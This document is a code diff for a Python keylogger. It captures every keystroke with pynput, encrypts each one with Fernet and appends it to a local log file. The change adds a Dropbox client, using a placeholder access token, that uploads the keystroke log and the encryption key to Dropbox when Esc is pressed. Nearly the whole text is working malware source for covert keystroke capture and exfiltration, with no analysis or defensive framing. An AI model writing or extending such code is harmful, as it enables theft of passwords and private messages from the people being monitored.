@@ -1,32 +1,51 @@
-import pynput
-import cryptography
-import re
 import os
+import re
+import time
+from pynput import keyboard
 from cryptography.fernet import Fernet
+import dropbox
+
+access_token = "ACCESS_TOKEN"
+dbx = dropbox.Dropbox(access_token)
 
 key = Fernet.generate_key()
 f = Fernet(key)
-print(key)
-with open("key.txt","wb") as y:
-    y.write(key)
+print("Encryption Key:", key)
 
-from pynput import keyboard
-with open("input.txt", 'wb') as x:
+with open("key.txt", "wb") as key_file:
+    key_file.write(key)
+
+def file_upload(filename):
+    timestamp = time.strftime("%Y%m%d-%H%M%S")
+    unique_name = f"{filename}_{timestamp}"
+    with open(filename, "rb") as file:
+        dbx.files_upload(file.read(), f'/{unique_name}', mute=True)
+    print(f"Uploaded {unique_name} to Dropbox.")
+
+log_filename = "input.txt"
+
+with open(log_filename, "ab") as log_file:
+
     def on_press(key):
-        saved="{0}".format(key)
-        saved2=re.sub("'","",saved)
-        encrypted=f.encrypt(saved2.encode())
-        if key == keyboard.Key.esc:
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                saved = key.char
+            else:
+                saved = f"[{key.name}]"
             
-            return False 
-        # if key == keyboard.Key.enter:
-        #     x.write(b"\n")
-        # if key == keyboard.Key.space:
-        #     x.write(b"\n")
-        # else:
-        x.write(encrypted+ b'\n')
+            encrypted = f.encrypt(saved.encode())
+            
+            log_file.write(encrypted + b'\n')
+            log_file.flush()  
 
-    # ...or, in a non-blocking fashion:
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    listener.join()
+            if key == keyboard.Key.esc:
+                print("Esc key pressed. Exiting and uploading files.")
+                file_upload(log_filename)
+                file_upload("key.txt")
+                return False  
+
+        except Exception as e:
+            print(f"Error processing key: {key}, {e}")
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
